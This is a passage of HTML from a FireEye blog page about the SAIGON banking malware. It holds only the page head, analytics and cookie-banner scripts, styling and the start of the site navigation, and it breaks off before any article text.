
<!DOCTYPE html>
<html>
<head>

<script>
    var companyDetails6Sense = localStorage.getItem('_6senseCompanyDetails');

    if(null != companyDetails6Sense || companyDetails6Sense != "" || companyDetails6Sense != undefined){
		var jsonVal = JSON.parse(companyDetails6Sense);

        var companyRevenueRange = jsonVal.company.revenue_range;
        var companyCountry = jsonVal.company.country;
        var companyIndustry = jsonVal.company.industry;
        var companyName = jsonVal.company.name;
        var companyRegion = jsonVal.company.region;
        var companyDomain = jsonVal.company.domain;
    	var segments = JSON.stringify(jsonVal.segments);
    	
        window.dataLayer=window.dataLayer ||[];
        window.dataLayer.push({
                "company_industry" : companyIndustry,
                "company_name" : companyName,
                "company_revenue" : companyRevenueRange,
                "company_country" : companyCountry,
                "company_region" : companyRegion,
            	"company_domain" : companyDomain,
            	"segments" : segments
        });
    }

</script>

<style>.async-hide { opacity: 0 !important} </style>
<script>(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
(a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
})(window,document.documentElement,'async-hide','dataLayer',4000,
{"GTM-5ZX7QTZ":true});</script>

<title>SAIGON, the Mysterious Ursnif Fork | FireEye Inc</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="alternate" type="application/atom+xml" title="Atom Feed for &#39;SAIGON, the Mysterious Ursnif Fork&#39;" href="/content/fireeye-www/en_US/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork/_jcr_content.feed">
<link rel="canonical" href="https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html">
<meta name="language" content="en">
<meta name="locale" content="en_US">
<meta http-equiv="cleartype" content="on">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<meta name="description" content="We discuss SAIGON, banking malware most likely based on the source code of the v3 variant of Ursnif.
">

<meta itemprop="name" content="SAIGON, the Mysterious Ursnif Fork">
<meta itemprop="description" content="We discuss SAIGON, banking malware most likely based on the source code of the v3 variant of Ursnif.
">
<meta itemprop="image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">

<meta name="twitter:site" content="@FireEye">
<meta name="twitter:title" content="SAIGON, the Mysterious Ursnif Fork">
<meta name="twitter:description" content="We discuss SAIGON, banking malware most likely based on the source code of the v3 variant of Ursnif.
">
<meta name="twitter:creator" content="@FireEye">
<meta name="twitter:image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">

<meta property="og:title" content="SAIGON, the Mysterious Ursnif Fork">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html">
<meta property="og:image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">
<meta property="og:description" content="We discuss SAIGON, banking malware most likely based on the source code of the v3 variant of Ursnif.
">
<meta property="og:site_name" content="FireEye">
<meta property="fb:admins" content="45127269202">
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery.min.js"></script>

<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-MVGC8KK');</script>


<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery/granite/csrf.min.js"></script>
<script type="text/javascript" src="/etc/designs/fireeye-www/clientlibs_nav.min.js"></script>
<script type="text/javascript">
var cookiesOK = $.cookie("ec-privacy");
var fdc =fdc || {};
var onAccept = function () {
	$.cookie("ec-privacy", "accept", { path: "/", expires: 365 });
	jQuery("#cookie-privacy-banner").hide();
};

var onDecline = function () {
	$.cookie("ec-privacy", "decline", { path: "/", expires: 365 });
	jQuery("#cookie-privacy-banner").hide();
};

var ipLocation = (function () {
	var banner ="#cookie-privacy-banner";

	/* Show the privacy notification banner. */
	var showBanner = function (banner) {
		jQuery(banner).show();
	};

	/* Suppress the privacy notification banner. */
	var hideBanner = function (banner) {
		jQuery(banner).hide();
	};

	/* These are the country codes for the countries subject to EC privacy laws.
	 * We will check to see if a visitor is coming from one of these countries.
	 * If they are, we display a privacy notification banner. If not, we
	 * do nothing. */
	var countries = {
		"AT": true,"BE": true,"BG": true,"HR": true,"CY": true,"CZ": true,"DK": true,
		"EE": true,"FI": true,"FR": true,"DE": true,"GR": true,"HU": true,"IE": true,
		"IT": true,"LV": true,"LT": true,"LU": true,"MT": true,"NL": true,"PL": true,
		"PT": true,"RO": true,"SK": true,"SI": true,"ES": true,"SE": true,"GB": true
	};
	var defaultSite = "US";

	var onSuccess = function (geoipResponse) {
		fdc.geoipresponse=geoipResponse;
		/* There's no guarantee that a successful response object
		 * has any particular property, so we need to code defensively. */
		if (!geoipResponse.country.iso_code) {
			hideBanner(banner);
			return;
		}
		//
		if (location.host.indexOf("stage") >= 0 && geoipResponse.country.iso_code === "SG") {
            geoipResponse.country.iso_code = "ES"
        }
		/* ISO country codes are in upper case. */
		var code = geoipResponse.country.iso_code;
			
		
		if ((countries[code]) && (cookiesOK == undefined)) {
			showBanner(banner);
		}
		else {
			hideBanner(banner);
		}
	};

	/* We don't really care what the error is. */
	var onError = function (error) {
		hideBanner(banner);
	};

	return function () {
		geoip2.country( onSuccess, onError );
	};
}());
ipLocation();
</script>
<div class="htmlpassthru_836d htmlpassthru">

<script type="text/javascript">
    if (!String.prototype.includes) {
        String.prototype.includes = function() {
            return String.prototype.indexOf.apply(this, arguments) !== -1;
        };
    }
var userAgent = navigator.userAgent,
gomezAgent = userAgent.includes("GomezAgent"),
prtgAgent = userAgent.includes("PRTG Network Monitor");

if (gomezAgent || prtgAgent) {
    cookiesOK = "decline";
}

if (cookiesOK != "decline") {
    // Google Analytics was here. Now it's in Tealium and GTM.
}
// Temporary patch for AA issue.
if(typeof _satellite == "undefined") {
    _satellite = {};
    _satellite.track = function(){};
}
</script>
<style>
@media ( max-width : 959px) {
    .g04 .megamenu .n03-sub_table .n03-sub_cell, .g04 .megamenu .separator {
        display: block;
    }
    .g04 .megamenu .n03_list-item-sub>.megamenu-cta {
        padding: 0;
    }
    .g04 .megamenu .n03-sub_cell.n03-sub_cell-utility {
        padding: 11px 0 11px 10px;
    }
}

@media ( min-width : 48em) {
    .cta-bar .n01 .n01_cell {
        width: auto;
    }
}

/* styles for the CTA bar test */
.n01.n01v1 .n01_cell {
    background-color: #222;
    border: 1px solid #444;
}

.n01.n01v1 .n01_cell .ficon, .n01.n01v1 .n01_cell .n01_label, .n01.n01v1 .n01_text
    {
    color: #fff;
}

@media ( min-width : 48em) {
    .n01.n01v1 .n01_cell {
        background-color: transparent;
        border: none;
    }
    .n01.n01v1 .n01_link {
        background-color: #222;
        border: 1px solid #444;
        border-right: 0;
    }
}
/* fix for new footer */
.g03v1 .g03-s-i:after {
    left: -3px;
}
/* fix for tables */
span.nowrap {
    white-space: nowrap;
}
/* fix for blog cta */
.blog-cta {
    border: 1px solid #dadadb;
    background-color: #ebebed;
    margin-bottom: 10px;
    line-height: 0;
}
</style>
<link rel="stylesheet" type="text/css" href="https://cloud.typography.com/6746836/6977592/css/fonts.css" />
<link rel="stylesheet" type="text/css" href="/content/dam/fireeye-www/fw/css/patch.css?v=1" />
<script type="text/javascript">
var addthis_config = addthis_config||{};
    addthis_config.data_track_clickback = false;
var addthis_share = {
   url: window.location.href
};
</script>
<style>
/* fix for IE */
.uc-he01v1 .uc-he01_container .background {
    max-height: 470px;
    position: absolute;
}
.uc-he01v2 .uc-he01_container .background {
    position: absolute;
}
@media (max-width: 48em) {
    .uc-he01v1 .uc-he01_container .background {
        max-height: 320px;
    }
}
@media (min-width: 54em) {
    .uc-he01v1 .uc-he01_container .background {
        max-height: 600px;
    }
}
</style>
<style>
/* Update the images used in the Table component. */
.c09v1 .tablesorter-default .header, .c09v1 .tablesorter-default .tablesorter-header {
background-position-x: calc(100% - 4px);
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjc2NDE0RUUyNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjc2NDE0RUUzNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0RkY2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI1MDA2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz567IGQAAAApklEQVR42mL8//8/A0kApAELlgJiG2xyTDjMcQFiayDmRJfApkEbiJWgiq2J0eCCxLYBYkF8GjAUAIEvLg2C2JwAdZ42Ng022DyJ7kwmJFOM8YS+INRABkZSI45sDSAnxRFQuweIj8D8cA+Iz+JR/B6kGD2UQALf8ZiOEawgU45iUQyy/SqumD4C1YgMNhNKS3vwGYBNw1WoM75jdSKpGYjkiAMIMAAPu279CuYueAAAAABJRU5ErkJggg==)
}
.c09v1 .tablesorter-default thead .headerSortUp,.c09v1 .tablesorter-default thead .tablesorter-headerSortUp,.c09v1 .tablesorter-default thead .tablesorter-headerAsc{background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU4OTMyNEY5Njc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU4OTMyNEZBNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0Rjc2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI0Rjg2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5TuQesAAAAp0lEQVR42mL8//8/A0kApAELNgbicmxyuDTsBuJ3QCxIjIbQ/wjQQYyGu/9RgRI+DeX/McFuXBqUoO7GBkKxaZj5Hze4i67B5T9hAA5mRlIjjmwNSkAcR0DtHiA+wgTl3APis3gUvwcpBjGYkARBAt/xmM6ArgFkylEsikG2X8WmAWbLezSxzcgcJnzWYzMAm4arUGd8x+pEHPlBCohtsMmRHHEAAQYAbP+KkOIl8zUAAAAASUVORK5CYII=)}
.c09v1 .tablesorter-default thead .headerSortDown,.c09v1 .tablesorter-default thead .tablesorter-headerSortDown,.c09v1 .tablesorter-default thead .tablesorter-headerDesc{background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU4OTMyNEZENjc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU4OTMyNEZFNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0RkI2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI0RkM2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6nOhWUAAAAqElEQVR42mL8//8/AymACYe4FBDbkKLBBYitgZiTGA3aQKwEVWxNjAYXJDbIWYL4NGAoAAJfXBoEsTkB6jxtbBpssHkS3ZlMSKYY4wl+QVgwM1Ir4ghqALnxPwFcDlYJchIUz/yPG9yFqUPWoATE73BoCMWmAYTLsSjejawGXQMD1HpkoERIQyiS4g50eWwaGKDOAPlHEF2OBUdwV0CD+j26BMkxDRBgALvSCpUQlZEGAAAAAElFTkSuQmCC)}
.c09v1 .tablesorter-default thead .sorter-false {
    background-image: none;
}
@media (max-width: 41.9125em){
    .c09.c09v1.has-data-label tr>:not(:first-child):before {
        width: auto; min-width: 35%;
    }
}
</style>
<script>
$(document).ready(function(){
    if(typeof(ipLocation) !== "undefined" && typeof fdc.geoipResponse === "undefined"){ipLocation();}
    if(typeof fdc.geoipResponse !== "undefined"){showCountryNotification(fdc.geoipResponse);}
    if(typeof fdc.geoipResponse !== "undefined" && typeof fdc.geoipResponse.country !== "undefined" && fdc.geoipResponse.country.is_in_european_union && ($.cookie("ec-privacy") == undefined)){jQuery("#cookie-privacy-banner").show();}
});
function showCountryNotification(geoipResponse) {
	if (!geoipResponse.country || !geoipResponse.country.iso_code) {
        return;
    }
	var code = geoipResponse.country.iso_code,
	    langIndex = code === "FR" ? 2 : code === "DE" ? 3 : code === "JP" ? 4 : code === "KR" ? 5 : 1;
	if (langIndex > 1) {
		$('.c08_modal.lang').addClass("is-open");
		$('.c08_modal.lang .col:nth-child(' + (langIndex - 1) + ')').show();
		$('.c08_modal.lang, .c08_modal.lang [data-behavior="dismiss-c08"]').click(function(){
		    $.cookie("country-notification", "decline", { path: "/", expires: 365 });
		    closec08();
		});
		$('.c08_modal.lang .c08').click(function(e){
		    e.stopPropagation();
		});
		if (($.cookie("country-notification") === "decline") || $(".g01_options_list li:nth-child(" + langIndex + ") a").attr("href").indexOf(".html") < 0) {
		    closec08();
		} else {
		    $(".c08_modal.lang .btn").eq(langIndex - 2).attr("href", $(".g01_options_list li:nth-child(" + langIndex + ") a").attr("href"));
		}
	}
}
</script>
<script>    
     var _6SenseJsonObj = localStorage.getItem('_6senseCompanyDetails'),
         _6SenseTime = localStorage.getItem('_6senseCompanyDetails-timestamp'),
         isJsonStale = _6SenseTime === null ? true : Date.now() - parseInt(_6SenseTime) > 86400000; // 86400000 = 1 day in ms
     
     window._6si = window._6si || [];
     window._6si.push(['enableEventTracking', true]);
     window._6si.push(['setToken', '1322340356018696d853e0ac6f7ce3a2']);
     window._6si.push(['setEndpoint', 'b.6sc.co']);
     if(_6SenseJsonObj === null || isJsonStale){
       window._6si.push(['enableCompanyDetails', true]);
       window._6si.push(['setEpsilonKey', '325d6d60e24c7cfc3a782839d85ce08c8d3bb27c']);
       localStorage.setItem('_6senseCompanyDetails-timestamp', Date.now());
     }  
    (function () {
          var gd = document.createElement('script');
      gd.type = 'text/javascript';
      gd.async = true;
      gd.src = '//j.6sc.co/6si.min.js';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(gd, s);
     })();
</script>
<script>
    var jsonObj;

    function targetPageParams() { 
        jsonObj = localStorage.getItem('_6senseCompanyDetails');
        if(jsonObj) {
        	var jsonVal = JSON.parse(jsonObj);
            return { 
                "companyRevenueRange": jsonVal.company.revenue_range, 
                "companyCountry": jsonVal.company.country, 
                "companyIndustry": jsonVal.company.industry,
                "companyName": jsonVal.company.name,
                "companyRegion": jsonVal.company.region,
                "companyDomain": jsonVal.company.domain,
                "segments": JSON.stringify(jsonVal.segments)
            }; 
        }
     }; 
</script>
<script>
$(document).ready(function(){
    $(".loadmore").on("click", function(){$(".list.parbase").addClass("no-max-height");});
    // Don't show title text for textures.
    $(".texture img").attr("title", "");
});
</script>
<style>
.no-max-height .c11v9 h4{
    max-height: none !important;
}
.g04 #header-search .search-field_submit:after {
    font-size: 9px;
}
.c11v8.hideLinkText .btn {
    display: inline-block;
}
/* CTA fix */
.g04 .megamenu-tab .has-inner-cta .n03-sub_container {
    padding: 0;
    margin: 0 0 0 10px;
    max-width: 1210px;
}
.g04 .megamenu-tab .has-inner-cta .col-wrap {
    padding: 40px 0;
}
.g04 .n03-sub_container[data-columns="1"] .megamenu-cta {
    width: 50%;
}
.g04 .n03-sub_container[data-columns="2"] .megamenu-cta {
    width: 33.9%;
}
.g04 .has-inner-cta > [data-columns="2"] .n03-sub_cell {
    width: calc(50% - 60px);
}
.g04 .n03-sub_container[data-columns="3"] .megamenu-cta {
    width: 25%;
}
.g04 .n03-sub_container[data-columns="4"] .megamenu-cta {
    width: 20%;
}
.g04 .megamenu-cta h5 {
    line-height: 1.4;
}
html .g04 header .megamenu-cta h5 {
    font-weight: 500;
    font-size: 15px;
    color: #44474d;
}
html .g04 header .megamenu-cta p {
    font-weight: 300;
    color: #44474d;
}
.g04 .n03-sub_table > .megamenu-cta {
    background: none;
    padding: 0;
}
.g04 .megamenu-cta .n03_utility {
    border: none;
    height: 100%;
}
.g04 .megamenu-cta .n03_utility_cell {
    display: block;
    width: auto;
    margin-left: 30px;
}
/* Un/re-comment to add/remove in the line to the left of the CTA in the megamenu. */
.g04 .n03-sub_table .col-wrap:not(:last-child) .separator.disabled {
    border-right-color: #ebebed;
}

/* Put a grid over the texture from a neighboring grid. */
.force {
    z-index: 15;
    position: relative;
}
/* Remove the gradient above the tiles on blog pages and reduce the space there. */
.iparsys + .l_container>div.gradient-top {
    background-image: none;
}
.iparsys + .l_container>.gradient-top>div>.g {
    padding: 0;
}
@media (min-width: 35em) {
    .entries .highlightFirst .c11v9 .c11-image-div {
        border-left: 1px solid #dadadb;
        border-right: 1px solid #dadadb;
    }
}
@media (max-width: 1024px) {
    .uc-he01v2 .panel .asset .image img {
        max-height: 200px;
	max-width: 300px;
    }
}
/* mobile view for MegaMenu CTA. */
@media (max-width: 1024px) {
    .g04 .megamenu-tab.open .n03_list-item-sub.has-inner-cta {
        padding-bottom: 0;
    }
    .g04 .has-inner-cta > [data-columns="2"] .n03-sub_cell,
    .g04 .n03-sub_container[data-columns="2"] .megamenu-cta {
        width: 100%;
        display: block;
    }
    .g04 .megamenu-tab .has-inner-cta .n03-sub_container {
        margin: 0;
    }
    .g04 .megamenu-tab .has-inner-cta .n03-sub_container .col-wrap {
        padding: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell {
        margin-left: 15px;
        margin-right: 22px;
    }
    .g04 .megamenu-cta .n03_utility_cell:nth-child(1) {
        padding-bottom: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell:nth-child(2) {
        padding-top: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell h5,
    .g04 .megamenu-cta .n03_utility_cell p {
        font-size: 12px;
    }
    .content-2-par .megamenus .n03-sub_table .megamenu-cta {
        border-radius: 0;
    }
}
/* Training pages side design. */
  .training-side-box {background: url('/content/dam/fireeye-www/brand/homepage-banner-images/hpb-bg-testimonial-red.jpg') left no-repeat; background-size: cover; padding:30px; border: 1px solid #dadadb; margin-bottom: 20px;}
  .training-side-text {color: #ffffff;}
  .training-side-text a:hover {color: #ffffff; text-decoration: underline;}

/* Avoid column breaks in ordered lists. */
  .c00 ol > li {page-break-inside: avoid; margin-bottom: 15px;}

/* Safari needs this on html to stop side scrolling, not just on the body. */
html {overflow-x:hidden;}
/* Make sure the footer is above a texture that precedes it. */
#g03-footer {z-index: 725;}
/* Allow border for linked images. */
.border>a>img {border: 1px solid #dadadb;}
/* Allows for easy scrollable text boxes on blog pages right in the Blog Text component. */
table.limitedHeight td {
    height: 350px;
    display: block;
    overflow-y: scroll;
    overflow-x: hidden;
    padding-bottom: 0;
}
/* Fix for edge case in Safari where page title in breadcrumbs wraps when the title is just the right length. */
.g02_list_item:last-child span {
    min-width: 360px;
    display: block;
}
</style></div>

<link rel="stylesheet" href="/etc/designs/fireeye-www/clientlibs_fw-2019.min.css" type="text/css">
<link rel="stylesheet" href="/etc/clientlibs/fireeye-blog/clientlibs_base.min.css" type="text/css">
<link rel="icon" type="image/vnd.microsoft.icon" href="/content/dam/fireeye-www/brand/logos/fireeye.ico">
<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="/content/dam/fireeye-www/brand/logos/fireeye.ico">
</head>

<body itemscope itemtype="http://schema.org/WebPage" data-redesign="redesign-2019"><script type="text/javascript">window.Granite = window.Granite || {}; window.Granite.csrf = true;</script>


<div class="clientcontext parbase"><script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/utils.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery/granite.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/foundation/clientlibs/jquery.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/foundation/clientlibs/shared.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/lodash/modern.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/cq/personalization/clientlib/personalization/kernel.min.js"></script>
<script type="text/javascript">
    $CQ(function() {
        CQ_Analytics.SegmentMgr.loadSegments("\/etc\/segmentation");
        CQ_Analytics.ClientContextUtils.init("\/etc\/clientcontext\/default", "\/content\/fireeye\u002Dwww\/en_US\/blog\/threat\u002Dresearch\/2020\/01\/saigon\u002Dmysterious\u002Dursnif\u002Dfork");

        
    });
</script>
</div>


<div class="masthead_v2 masthead-v2">
<div class="g04 masthead g04v1">


<div class="bottom-bar">
<div class="tab">
<span class="ficon ficon-warning"></span>
<p><a class="contact_bar" href="/company/incident-response.html">Report an Incident</a></p>
</div>
<div class="tab">
<span class="ficon ficon-phone2"></span>
<p><a class="contact_bar" href="/company/contact-us.html">Contact Us</a></p>
</div>
</div>
<div class="cta-bar">
<div class="content-well">
<ul>
<li>
<a class="contact_bar" href="/company/contact-us.html">
<span class="g04_label">Contact Us</span><span class="g04_icon"><span class="ficon ficon-phone3"></span></span>
</a>
</li>
<li style="display: none;" id="liveagent_button_online_573a00000008kP3">
<a class="contact_bar" href="javascript://Chat" onclick="liveagent.startChat('573a00000008kP3')">
<span class="g04_label">Chat with an Expert</span><span class="g04_icon"><span class="ficon ficon-chat"></span></span>
</a>
</li>
<li class="red">
<a class="contact_bar" href="/company/incident-response.html">
<span class="g04_label">Report an Incident</span><span class="g04_icon"><span class="ficon ficon-incident"></span></span>
</a>
</li>
</ul>
</div>
</div>

<script type="text/javascript">
    if (!window._laq) { window._laq = []; }
    window._laq.push(function(){
    	liveagent.showWhenOnline('573a00000008kP3', document.getElementById('liveagent_button_online_573a00000008kP3'));
    });
</script>
<script type="text/javascript" src="https://c.la2c2.salesforceliveagent.com/content/g/js/34.0/deployment.js"></script>
<script type="text/javascript">
    liveagent.init("https://d.la2c2.salesforceliveagent.com/chat", "572a0000000H8aJ", "00D3000000063LS");
</script><header role="banner" itemscope itemtype="http://schema.org/WPHeader">
<div class="language-and-search"> <div class="search">
<div class="content-searchbox searchbox">
<a class="g01_options-option option-search" href="#header-search" data-for="q" data-behavior="showHeaderMenu focusField">Search</a>
<div class="option-menu option-menu_search" id="header-search">
<form method="get" action="/search.html">
<fieldset class="search-field" title="Search FireEye.com">
<label class="search-field_label" for="q">Search FireEye.com</label>
<input class="input-text search-field_text" type="text" name="q" id="q" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-locale="en_US" placeholder="Search FireEye.com">
<div id="searchboxsuggestions"></div>
<button class="btn btn-secondary search-field_submit" type="submit">Go</button>
</fieldset>
</form>
</div>
</div>
</div>
</div>
<div class="logo-and-megamenu">
<div class="logo" itemscope itemtype="https://schema.org/Brand">
<a href="https://www.fireeye.com"><img src="/content/dam/fireeye-www/fw/images/fe-logo-color.svg" alt="FireEye" itemprop="logo" class="fireeye" /></a>
</div>
<nav class="megamenu">
<ul><li class="megamenu-tab" data-curry="/blog.html" data-link="/products.html">
<h4 class="megamenu-title">
<a href="/products.html" itemprop="url" class="MegaMenus">Products</a>
</h4>
<div class="content-0-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Enterprise Security</h4><ul><li itemprop="url"><a href="/products/helix.html" itemprop="name" class="MegaMenus">Helix Security Platform</a></li>
<li itemprop="url"><a href="/products/network-security.html" itemprop="name" class="MegaMenus">Network Security and Forensics</a></li>
<li itemprop="url"><a href="/products/endpoint-security.html" itemprop="name" class="MegaMenus">Endpoint Security</a></li>
<li itemprop="url"><a href="/products/email-security.html" itemprop="name" class="MegaMenus">Email Security</a></li>
<li itemprop="url"><a href="/products/cloudvisory.html" itemprop="name" class="MegaMenus">Cloudvisory</a></li>
<li itemprop="url"><a href="/products/detection-on-demand.html" itemprop="name" class="MegaMenus">Detection On Demand</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Security For:</h4><ul><li itemprop="url"><a href="/products/cloud-security.html" itemprop="name" class="MegaMenus">Cloud</a></li>
<li itemprop="url"><a href="/products/financial-services.html" itemprop="name" class="MegaMenus">Financial Services</a></li>
